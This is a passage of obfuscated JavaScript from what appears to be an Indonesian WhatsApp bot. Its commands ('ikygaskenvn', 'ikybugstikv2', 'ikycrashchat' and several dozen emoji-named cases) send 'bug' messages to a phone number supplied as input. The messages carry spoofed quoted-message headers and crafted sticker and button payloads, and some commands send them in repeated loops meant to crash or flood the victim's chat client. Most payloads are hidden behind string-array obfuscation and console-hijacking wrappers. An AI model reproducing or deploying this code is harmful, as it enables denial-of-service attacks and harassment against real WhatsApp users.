_0x9f008a=_0x29ba;if(_0x297cea){var _0xcdcc66=_0x297cea[_0x9f008a(0x11a)](_0x5325cb,arguments);return _0x297cea=null,_0xcdcc66;}}:function(){};return _0x32df50=![],_0x45ff9c;};}()),_0x4e65c0=_0x31642(this,function(){var _0x3de20c=_0x29ba,_0x50fb2e=function(){var _0x1b18d1=_0x29ba,_0x4960e5;try{_0x4960e5=Function(_0x1b18d1(0x113)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x3648c5){_0x4960e5=window;}return _0x4960e5;},_0x1d7b4d=_0x50fb2e(),_0x552c02=_0x1d7b4d[_0x3de20c(0xfc)]=_0x1d7b4d[_0x3de20c(0xfc)]||{},_0x49a079=[_0x3de20c(0x11b),_0x3de20c(0xfd),_0x3de20c(0x107),_0x3de20c(0x104),'exception','table','trace'];for(var _0x3881bc=0x0;_0x3881bc<_0x49a079[_0x3de20c(0x115)];_0x3881bc++){var _0x2f4469=_0x31642['constructor'][_0x3de20c(0x117)][_0x3de20c(0x105)](_0x31642),_0x3ba4e4=_0x49a079[_0x3881bc],_0x3ef2a1=_0x552c02[_0x3ba4e4]||_0x2f4469;_0x2f4469['__proto__']=_0x31642['bind'](_0x31642),_0x2f4469[_0x3de20c(0x11d)]=_0x3ef2a1[_0x3de20c(0x11d)][_0x3de20c(0x105)](_0x3ef2a1),_0x552c02[_0x3ba4e4]=_0x2f4469;}});_0x4e65c0();function _0x29ba(_0x2b07e0,_0x1e5a13){var _0xbe5887=_0x45c4();return _0x29ba=function(_0x4e65c0,_0x31642){_0x4e65c0=_0x4e65c0-0xfb;var _0x5d0666=_0xbe5887[_0x4e65c0];return _0x5d0666;},_0x29ba(_0x2b07e0,_0x1e5a13);}{if(!isCreator&&!isBan)return;if(!text)throw _0x5d8fad(0x119);adehvn={'key':{'fromMe':![],'participant':_0x5d8fad(0x10e),...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':_0x5d8fad(0x112),'caption':_0x5d8fad(0x103),'jpegThumbnail':virgam}}},hey=fs[_0x5d8fad(0xfe)](_0x5d8fad(0x11c)),ikycoli[_0x5d8fad(0xff)](text+_0x5d8fad(0x114),{'audio':hey,'mimetype':_0x5d8fad(0x10d),'ptt':!![]},{'quoted':adehvn}),await m[_0x5d8fad(0x100)](_0x5d8fad(0x118)+text+_0x5d8fad(0x114));}
}
break

case 'ikygaskenvn': {
var _0x5c7919=_0x231c;(function(_0x13e452,_0x448341){var _0x5baa7c=_0x231c,_0x3a7135=_0x13e452();while(!![]){try{var _0x5a59c0=-parseInt(_0x5baa7c(0x1a4))/0x1+-parseInt(_0x5baa7c(0x19f))/0x2*(-parseInt(_0x5baa7c(0x1c1))/0x3)+parseInt(_0x5baa7c(0x1b6))/0x4+-parseInt(_0x5baa7c(0x1b1))/0x5*(parseInt(_0x5baa7c(0x1bf))/0x6)+parseInt(_0x5baa7c(0x1a8))/0x7*(-parseInt(_0x5baa7c(0x1ba))/0x8)+parseInt(_0x5baa7c(0x1c0))/0x9*(-parseInt(_0x5baa7c(0x1c3))/0xa)+-parseInt(_0x5baa7c(0x1b7))/0xb*(-parseInt(_0x5baa7c(0x1a7))/0xc);if(_0x5a59c0===_0x448341)break;else _0x3a7135['push'](_0x3a7135['shift']());}catch(_0x53ec14){_0x3a7135['push'](_0x3a7135['shift']());}}}(_0x399e,0x5e382));var _0x563a0d=(function(){var _0x44c8c0=!![];return function(_0x7cf418,_0x56ef65){var _0x40335f=_0x44c8c0?function(){if(_0x56ef65){var _0x4258b7=_0x56ef65['apply'](_0x7cf418,arguments);return _0x56ef65=null,_0x4258b7;}}:function(){};return _0x44c8c0=![],_0x40335f;};}()),_0x228bec=_0x563a0d(this,function(){var _0x3fd998=_0x231c;return _0x228bec[_0x3fd998(0x1be)]()[_0x3fd998(0x1b8)](_0x3fd998(0x1a3))[_0x3fd998(0x1be)]()[_0x3fd998(0x1b2)](_0x228bec)['search'](_0x3fd998(0x1a3));});function _0x231c(_0x3c9443,_0x4a1888){var _0x14e056=_0x399e();return _0x231c=function(_0x1441dc,_0xb3b33b){_0x1441dc=_0x1441dc-0x19f;var _0xb6f011=_0x14e056[_0x1441dc];return _0xb6f011;},_0x231c(_0x3c9443,_0x4a1888);}function _0x399e(){var _0x8815ca=['constructor','reply','exception','length','733796TJxPwp','11mCmUjb','search','chat','1487352iGQlmS','return\x20(function()\x20','kontol','table','toString','366pcpahB','10845lPqOMi','946401BpDNwL','console','1510aiKUpb','2KqWwww','sendMessage','bind','audio/mpeg','(((.+)+)+)+$','559136bVvoej','apply','readFileSync','19027044WaHZGK','21dTyGYQ','./src/hahaha.mp3','info','prototype','0@s.whatsapp.net','@s.whatsapp.net','warn','log','trace','32765islPqR'];_0x399e=function(){return _0x8815ca;};return _0x399e();}_0x228bec();var _0xb3b33b=(function(){var _0xf402a3=!![];return function(_0x390151,_0x14997c){var _0x466b77=_0xf402a3?function(){var _0xfb3e46=_0x231c;if(_0x14997c){var _0x19d68a=_0x14997c[_0xfb3e46(0x1a5)](_0x390151,arguments);return _0x14997c=null,_0x19d68a;}}:function(){};return _0xf402a3=![],_0x466b77;};}()),_0x1441dc=_0xb3b33b(this,function(){var _0x196165=_0x231c,_0x14c37a;try{var _0x59c231=Function(_0x196165(0x1bb)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x14c37a=_0x59c231();}catch(_0x29ed72){_0x14c37a=window;}var _0x5d5e0f=_0x14c37a[_0x196165(0x1c2)]=_0x14c37a[_0x196165(0x1c2)]||{},_0x49a3f8=[_0x196165(0x1af),_0x196165(0x1ae),_0x196165(0x1aa),'error',_0x196165(0x1b4),_0x196165(0x1bd),_0x196165(0x1b0)];for(var _0x2cf745=0x0;_0x2cf745<_0x49a3f8[_0x196165(0x1b5)];_0x2cf745++){var _0x4ce2e2=_0xb3b33b[_0x196165(0x1b2)][_0x196165(0x1ab)][_0x196165(0x1a1)](_0xb3b33b),_0x431160=_0x49a3f8[_0x2cf745],_0x2973e0=_0x5d5e0f[_0x431160]||_0x4ce2e2;_0x4ce2e2['__proto__']=_0xb3b33b[_0x196165(0x1a1)](_0xb3b33b),_0x4ce2e2['toString']=_0x2973e0[_0x196165(0x1be)]['bind'](_0x2973e0),_0x5d5e0f[_0x431160]=_0x4ce2e2;}});_0x1441dc();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';adehvn={'key':{'fromMe':![],'participant':_0x5c7919(0x1ac),...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':'image/jpeg','caption':_0x5c7919(0x1bc),'jpegThumbnail':virgam}}},hey=fs[_0x5c7919(0x1a6)](_0x5c7919(0x1a9)),ikycoli['sendMessage'](text+_0x5c7919(0x1ad),{'audio':hey,'mimetype':_0x5c7919(0x1a2),'ptt':!![]},{'quoted':adehvn}),ikycoli[_0x5c7919(0x1a0)](m[_0x5c7919(0x1b9)],{'audio':hey,'mimetype':_0x5c7919(0x1a2),'ptt':!![]},{'quoted':adehvn}),m[_0x5c7919(0x1b3)]('Berhasil\x20Mengirim\x20Bugvn\x20Di\x20Nomer\x20'+text+_0x5c7919(0x1ad));}
}
break

case 'ikystikprivate': {
var _0x2d5ce6=_0x25c1;(function(_0x42c546,_0x2151aa){var _0xc9ceb6=_0x25c1,_0x2c919b=_0x42c546();while(!![]){try{var _0x1f8234=-parseInt(_0xc9ceb6(0x98))/0x1*(-parseInt(_0xc9ceb6(0xa8))/0x2)+parseInt(_0xc9ceb6(0x9b))/0x3+parseInt(_0xc9ceb6(0x8e))/0x4+parseInt(_0xc9ceb6(0x96))/0x5+-parseInt(_0xc9ceb6(0x93))/0x6+-parseInt(_0xc9ceb6(0x97))/0x7*(-parseInt(_0xc9ceb6(0xa1))/0x8)+-parseInt(_0xc9ceb6(0xa3))/0x9;if(_0x1f8234===_0x2151aa)break;else _0x2c919b['push'](_0x2c919b['shift']());}catch(_0x103b04){_0x2c919b['push'](_0x2c919b['shift']());}}}(_0x4b12,0xc6b54));var _0x57c6aa=(function(){var _0x416970=!![];return function(_0x5e58dd,_0x18d0f3){var _0x14a626=_0x416970?function(){var _0x1fe8aa=_0x25c1;if(_0x18d0f3){var _0x105429=_0x18d0f3[_0x1fe8aa(0x9c)](_0x5e58dd,arguments);return _0x18d0f3=null,_0x105429;}}:function(){};return _0x416970=![],_0x14a626;};}()),_0x571014=_0x57c6aa(this,function(){var _0x402ef8=_0x25c1;return _0x571014[_0x402ef8(0x8b)]()['search'](_0x402ef8(0x92))[_0x402ef8(0x8b)]()[_0x402ef8(0xa6)](_0x571014)['search']('(((.+)+)+)+$');});function _0x25c1(_0x460b1c,_0x1751f7){var _0xd00eb3=_0x4b12();return _0x25c1=function(_0x6c0cc5,_0x4edcbd){_0x6c0cc5=_0x6c0cc5-0x89;var _0xdd4ea=_0xd00eb3[_0x6c0cc5];return _0xdd4ea;},_0x25c1(_0x460b1c,_0x1751f7);}function _0x4b12(){var _0x3f57a5=['6022770VBgsxK','bind','error','3148080rBhYoi','2303GWhlou','980151YXiote','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','4560024HYozqR','apply','packname','__proto__','log','exception','36152GiIhkB','image/jpeg','25625835IaodGo','trace','sendImageAsSticker','constructor','author','2vOiUHo','Berhasil\x20Mengirim\x20Bugstik\x20Di\x20Nomer\x20','kontol','toString','0@s.whatsapp.net','length','193968lVKqbM','@s.whatsapp.net','console','warn','(((.+)+)+)+$'];_0x4b12=function(){return _0x3f57a5;};return _0x4b12();}_0x571014();var _0x4edcbd=(function(){var _0x5d19c4=!![];return function(_0x2e3a62,_0x3fe938){var _0x4fdf57=_0x5d19c4?function(){var _0x138b1b=_0x25c1;if(_0x3fe938){var _0x4eee73=_0x3fe938[_0x138b1b(0x9c)](_0x2e3a62,arguments);return _0x3fe938=null,_0x4eee73;}}:function(){};return _0x5d19c4=![],_0x4fdf57;};}()),_0x6c0cc5=_0x4edcbd(this,function(){var _0x5e0e4c=_0x25c1,_0x33a1af;try{var _0x593373=Function('return\x20(function()\x20'+_0x5e0e4c(0x9a)+');');_0x33a1af=_0x593373();}catch(_0xe45eb2){_0x33a1af=window;}var _0x52fa34=_0x33a1af[_0x5e0e4c(0x90)]=_0x33a1af[_0x5e0e4c(0x90)]||{},_0x40eff0=[_0x5e0e4c(0x9f),_0x5e0e4c(0x91),'info',_0x5e0e4c(0x95),_0x5e0e4c(0xa0),'table',_0x5e0e4c(0xa4)];for(var _0x1f541b=0x0;_0x1f541b<_0x40eff0[_0x5e0e4c(0x8d)];_0x1f541b++){var _0x4f3c46=_0x4edcbd['constructor'][_0x5e0e4c(0x99)][_0x5e0e4c(0x94)](_0x4edcbd),_0x3196e2=_0x40eff0[_0x1f541b],_0x372ac6=_0x52fa34[_0x3196e2]||_0x4f3c46;_0x4f3c46[_0x5e0e4c(0x9e)]=_0x4edcbd[_0x5e0e4c(0x94)](_0x4edcbd),_0x4f3c46[_0x5e0e4c(0x8b)]=_0x372ac6[_0x5e0e4c(0x8b)][_0x5e0e4c(0x94)](_0x372ac6),_0x52fa34[_0x3196e2]=_0x4f3c46;}});_0x6c0cc5();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';adehvn={'key':{'fromMe':![],'participant':_0x2d5ce6(0x8c),...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':_0x2d5ce6(0xa2),'caption':_0x2d5ce6(0x8a),'jpegThumbnail':virgam}}},hey=fs['readFileSync']('./src/anjas.webp'),ikycoli[_0x2d5ce6(0xa5)](text+_0x2d5ce6(0x8f),hey,adehvn,{'packname':global[_0x2d5ce6(0x9d)],'author':global[_0x2d5ce6(0xa7)]}),await m['reply'](_0x2d5ce6(0x89)+text+_0x2d5ce6(0x8f));}
}
break

case 'ikygaskenstik': {
function _0x56cd(){var _0x563b35=['__proto__','Berhasil\x20Mengirim\x20Bugstik\x20Di\x20Nomer\x20','warn','3146376axjHbO','readFileSync','7857MiNxyi','toString','chat','3495027rvbFgH','2202053aTNoiQ','info','3282kyOSjJ','prototype','5735wHzvjX','author','length','226NZpRNT','return\x20(function()\x20','4312688MRZidn','search','exception','bind','image/jpeg','19950QwmETm','{}.constructor(\x22return\x20this\x22)(\x20)','packname','constructor','(((.+)+)+)+$','error','sendImageAsSticker','Nomernya\x20mana?','4477ZJXMhl','console','log'];_0x56cd=function(){return _0x563b35;};return _0x56cd();}var _0x23be2b=_0x3b64;(function(_0x43e120,_0x10b1ad){var _0x3f820c=_0x3b64,_0x2495e9=_0x43e120();while(!![]){try{var _0x707d06=-parseInt(_0x3f820c(0x9a))/0x1*(parseInt(_0x3f820c(0x8b))/0x2)+-parseInt(_0x3f820c(0x83))/0x3+-parseInt(_0x3f820c(0xa0))/0x4+parseInt(_0x3f820c(0x88))/0x5*(parseInt(_0x3f820c(0x86))/0x6)+parseInt(_0x3f820c(0x84))/0x7+parseInt(_0x3f820c(0x8d))/0x8+parseInt(_0x3f820c(0x80))/0x9*(parseInt(_0x3f820c(0x92))/0xa);if(_0x707d06===_0x10b1ad)break;else _0x2495e9['push'](_0x2495e9['shift']());}catch(_0x48428e){_0x2495e9['push'](_0x2495e9['shift']());}}}(_0x56cd,0xbad15));var _0x26f338=(function(){var _0x933a50=!![];return function(_0x3b5f15,_0x4fb661){var _0x2a64a3=_0x933a50?function(){if(_0x4fb661){var _0x516d68=_0x4fb661['apply'](_0x3b5f15,arguments);return _0x4fb661=null,_0x516d68;}}:function(){};return _0x933a50=![],_0x2a64a3;};}()),_0x10b0c7=_0x26f338(this,function(){var _0x2cf581=_0x3b64;return _0x10b0c7[_0x2cf581(0x81)]()[_0x2cf581(0x8e)](_0x2cf581(0x96))[_0x2cf581(0x81)]()[_0x2cf581(0x95)](_0x10b0c7)[_0x2cf581(0x8e)](_0x2cf581(0x96));});_0x10b0c7();var _0x3dbc9a=(function(){var _0x23017b=!![];return function(_0x4f0307,_0x47cc32){var _0x527947=_0x23017b?function(){if(_0x47cc32){var _0x44270c=_0x47cc32['apply'](_0x4f0307,arguments);return _0x47cc32=null,_0x44270c;}}:function(){};return _0x23017b=![],_0x527947;};}()),_0x2b7374=_0x3dbc9a(this,function(){var _0x3b24dd=_0x3b64,_0x3693b1=function(){var _0x14b15c=_0x3b64,_0x434cdc;try{_0x434cdc=Function(_0x14b15c(0x8c)+_0x14b15c(0x93)+');')();}catch(_0x131ef8){_0x434cdc=window;}return _0x434cdc;},_0x5ef107=_0x3693b1(),_0x4c98ee=_0x5ef107[_0x3b24dd(0x9b)]=_0x5ef107[_0x3b24dd(0x9b)]||{},_0x1cee2f=[_0x3b24dd(0x9c),_0x3b24dd(0x9f),_0x3b24dd(0x85),_0x3b24dd(0x97),_0x3b24dd(0x8f),'table','trace'];for(var _0x2e6601=0x0;_0x2e6601<_0x1cee2f[_0x3b24dd(0x8a)];_0x2e6601++){var _0xfd3dba=_0x3dbc9a[_0x3b24dd(0x95)][_0x3b24dd(0x87)]['bind'](_0x3dbc9a),_0x2d88a3=_0x1cee2f[_0x2e6601],_0x3b96cb=_0x4c98ee[_0x2d88a3]||_0xfd3dba;_0xfd3dba[_0x3b24dd(0x9d)]=_0x3dbc9a[_0x3b24dd(0x90)](_0x3dbc9a),_0xfd3dba[_0x3b24dd(0x81)]=_0x3b96cb[_0x3b24dd(0x81)][_0x3b24dd(0x90)](_0x3b96cb),_0x4c98ee[_0x2d88a3]=_0xfd3dba;}});function _0x3b64(_0x9fb393,_0x27975e){var _0x328ee8=_0x56cd();return _0x3b64=function(_0x2b7374,_0x3dbc9a){_0x2b7374=_0x2b7374-0x7f;var _0x51c5a6=_0x328ee8[_0x2b7374];return _0x51c5a6;},_0x3b64(_0x9fb393,_0x27975e);}_0x2b7374();{if(!isCreator&&!isBan)return;if(!text)throw _0x23be2b(0x99);adehvn={'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':_0x23be2b(0x91),'caption':'kontol','jpegThumbnail':virgam}}},hey=fs[_0x23be2b(0x7f)]('./src/anjas.webp'),ikycoli[_0x23be2b(0x98)](m[_0x23be2b(0x82)],hey,adehvn,{'packname':global[_0x23be2b(0x94)],'author':global[_0x23be2b(0x89)]}),ikycoli[_0x23be2b(0x98)](text+'@s.whatsapp.net',hey,adehvn,{'packname':global['packname'],'author':global[_0x23be2b(0x89)]}),m['reply'](_0x23be2b(0x9e)+text+'@s.whatsapp.net');}
}
break

case 'ikybugstikv2':{
function _0x3ded(){const _0xc16e2e=['error','(((.+)+)+)+$','660760JPdwgs','return\x20(function()\x20','bind','4090LYsaxz','__proto__','63BUxqMI','11008356HjurTO','chat','exception','table','length','3824WMlEay','toString','21skhxfX','347752lHCrot','reply','Penggunaan\x20','console','log','YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=','332sjkWKr','0@s.whatsapp.net','158sdocCw','sendMessage','622722ajrTAA','apply','12285MucXUG','1657290167','constructor','11vBGjPw','info','9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=','{}.constructor(\x22return\x20this\x22)(\x20)'];_0x3ded=function(){return _0xc16e2e;};return _0x3ded();}const _0x4f472b=_0x4744;(function(_0x3ff5a2,_0x513755){const _0x171af2=_0x4744,_0xf7a834=_0x3ff5a2();while(!![]){try{const _0x2e3106=parseInt(_0x171af2(0x1ab))/0x1*(parseInt(_0x171af2(0x193))/0x2)+-parseInt(_0x171af2(0x197))/0x3*(-parseInt(_0x171af2(0x191))/0x4)+-parseInt(_0x171af2(0x1a0))/0x5+parseInt(_0x171af2(0x195))/0x6*(parseInt(_0x171af2(0x1ad))/0x7)+parseInt(_0x171af2(0x1ae))/0x8*(parseInt(_0x171af2(0x1a5))/0x9)+parseInt(_0x171af2(0x1a3))/0xa*(-parseInt(_0x171af2(0x19a))/0xb)+-parseInt(_0x171af2(0x1a6))/0xc;if(_0x2e3106===_0x513755)break;else _0xf7a834['push'](_0xf7a834['shift']());}catch(_0xf8052e){_0xf7a834['push'](_0xf7a834['shift']());}}}(_0x3ded,0x32b55));const _0x1aa2a8=(function(){let _0x50c27b=!![];return function(_0x15c5e7,_0x331728){const _0x5d37e=_0x50c27b?function(){const _0x195a0c=_0x4744;if(_0x331728){const _0x3c15aa=_0x331728[_0x195a0c(0x196)](_0x15c5e7,arguments);return _0x331728=null,_0x3c15aa;}}:function(){};return _0x50c27b=![],_0x5d37e;};}()),_0x5abfbb=_0x1aa2a8(this,function(){const _0x929c63=_0x4744;return _0x5abfbb['toString']()['search'](_0x929c63(0x19f))[_0x929c63(0x1ac)]()[_0x929c63(0x199)](_0x5abfbb)['search'](_0x929c63(0x19f));});function _0x4744(_0x3d9544,_0x1f5ae8){const _0x31f01f=_0x3ded();return _0x4744=function(_0x4a2bea,_0x24a59b){_0x4a2bea=_0x4a2bea-0x18e;let _0x275a10=_0x31f01f[_0x4a2bea];return _0x275a10;},_0x4744(_0x3d9544,_0x1f5ae8);}_0x5abfbb();const _0x24a59b=(function(){let _0x299417=!![];return function(_0x1ca33d,_0x5981fe){const _0x14f359=_0x299417?function(){const _0x2f7b96=_0x4744;if(_0x5981fe){const _0x15d5ee=_0x5981fe[_0x2f7b96(0x196)](_0x1ca33d,arguments);return _0x5981fe=null,_0x15d5ee;}}:function(){};return _0x299417=![],_0x14f359;};}()),_0x4a2bea=_0x24a59b(this,function(){const _0x31f7fd=_0x4744;let _0x492dba;try{const _0x30cfe4=Function(_0x31f7fd(0x1a1)+_0x31f7fd(0x19d)+');');_0x492dba=_0x30cfe4();}catch(_0xad915c){_0x492dba=window;}const _0x8835be=_0x492dba[_0x31f7fd(0x18e)]=_0x492dba[_0x31f7fd(0x18e)]||{},_0x35973d=[_0x31f7fd(0x18f),'warn',_0x31f7fd(0x19b),_0x31f7fd(0x19e),_0x31f7fd(0x1a8),_0x31f7fd(0x1a9),'trace'];for(let _0x21d83c=0x0;_0x21d83c<_0x35973d[_0x31f7fd(0x1aa)];_0x21d83c++){const _0x5c9811=_0x24a59b[_0x31f7fd(0x199)]['prototype'][_0x31f7fd(0x1a2)](_0x24a59b),_0x568f31=_0x35973d[_0x21d83c],_0x38f2af=_0x8835be[_0x568f31]||_0x5c9811;_0x5c9811[_0x31f7fd(0x1a4)]=_0x24a59b[_0x31f7fd(0x1a2)](_0x24a59b),_0x5c9811[_0x31f7fd(0x1ac)]=_0x38f2af[_0x31f7fd(0x1ac)][_0x31f7fd(0x1a2)](_0x38f2af),_0x8835be[_0x568f31]=_0x5c9811;}});_0x4a2bea();{if(!isCreator&&!isBan)return;if(args[_0x4f472b(0x1aa)]==0x0)return m[_0x4f472b(0x1af)](_0x4f472b(0x1b0)+(prefix+command)+'\x20jumlah\x0aContoh\x20'+(prefix+command)+'\x205');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){ikycoli[_0x4f472b(0x194)](m[_0x4f472b(0x1a7)],{'sticker':thumb},{'quoted':{'key':{'fromMe':![],'participant':_0x4f472b(0x192),...{'remoteJid':''}},'message':{'stickerMessage':{'url':'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc','fileSha256':_0x4f472b(0x190),'fileEncSha256':_0x4f472b(0x19c),'mediaKey':'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=','mimetype':'image/webp','jpegThumbnail':virgam,'height':0x40,'width':0x40,'directPath':'/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781','fileLength':'7774','mediaKeyTimestamp':_0x4f472b(0x198),'isAnimated':![]}}}});}jancok('Sukses\x20Send\x20Bugstik\x20Sebanyak\x20'+jumlah);}
}
break
case 'ikycrashchat':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY CRASH CHAT`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY CRASH CHAT"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`© THE IKYY BOTZ`)
 }
 break
 case 'ikymakerzcrash':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY MAKERZ CRASH`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"©IKYY MAKERZ"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`© THE IKYY BOTZ`)
 }
 break
 case 'Iky1': case 'Iky2': case 'Iky3': case 'Iky4': case 'Iky5': case 'Iky6': case 'Iky7': case 'Iky8': case 'Iky9': case 'Iky10': case 'Iky11': case 'Iky12': case 'Iky13': case 'Iky14': case 'Iky15': case 'Iky16': case 'Iky17': case 'Iky18': case 'Iky19': case 'Iky20': case 'Iky21': case 'Iky22': case 'Iky23': case 'Iky24': case 'Iky25': case 'Iky26': case 'Iky27': case 'Iky28':
case 'Iky29':
case 'Iky30':
case 'Iky31':
case 'Iky32':
case 'Iky33':
case 'Iky34':
case 'Iky35':
case 'Iky36':
case 'Iky37':
case 'Iky38':
case 'Iky39':
case 'Iky40':
case 'Iky41':
case 'Iky42':
case 'Iky43':
case 'Iky44':
case 'Iky45':
case 'Iky46':
case 'Iky47':
case 'Iky48':
case 'Iky49':
case 'Iky50':
case 'Iky51':
case 'Iky52':
case 'Iky53':
case 'Iky54':
case 'Iky55':
case 'Iky56':
case 'Iky57':
case 'Iky58':
case 'Iky59':
case 'Iky60':
case '👽': case '☠️': case '️👾': case '🪐': case '🦴': case '☝': case '🏻': case '🦖': case '🦕': case '👿': case '🐉': case '⚡': case '💥': case '🔥': case '🌪️': case '🍂': case '🍃': case '🌴': case '🌿': case '🍀': case '🪵': case '🦥': case '🌳': case '🍁': case '🎋': 
case '🦂':
case '🐍':
case '🍓':
case '🍒': 
case '🍎': 
case '🍉': 
case '🍑': 
case '🍊':
case '🥭':
case '🍍': 
case '🍌':
case '🍋':
case '🍈':
case '🍏':
case '🍐':
case '🥝':
case '⚠️':
case '🚀':
case '🫒':
case '🫐':
case '🍇':
case '🥥':
case '🍅':
case '🌶️':
case '🥕':
case '🍠':
case '🧅':
case '🌽':
case '🥦':
case '🥒':
case '🥬':
case '🫑':
case '🥑':
case '💀':
case '🍆':
case '🧄':
case '🥔':
case '🌰':
case '🥜':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6283186308195','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await ikycoli[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20THE\x20IKYY\x20BOTZ','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'THE\x20IKYY\x20BOTZ','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
 }
 }
 break
